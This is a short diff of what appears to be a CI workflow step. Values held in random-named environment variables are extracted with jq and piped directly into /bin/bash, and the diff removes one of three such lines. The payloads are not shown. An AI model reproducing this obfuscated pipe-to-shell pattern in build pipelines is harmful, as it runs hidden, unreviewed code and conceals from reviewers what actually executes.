@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$gbm87" | jq -r .vxaai99420 | /bin/bash
           echo $alh3656 | jq -r .e3781 | /bin/bash
-          echo $emihb02 | jq -r .bnkl0 | /bin/bash
 
       - name: Archive results
         if: always()
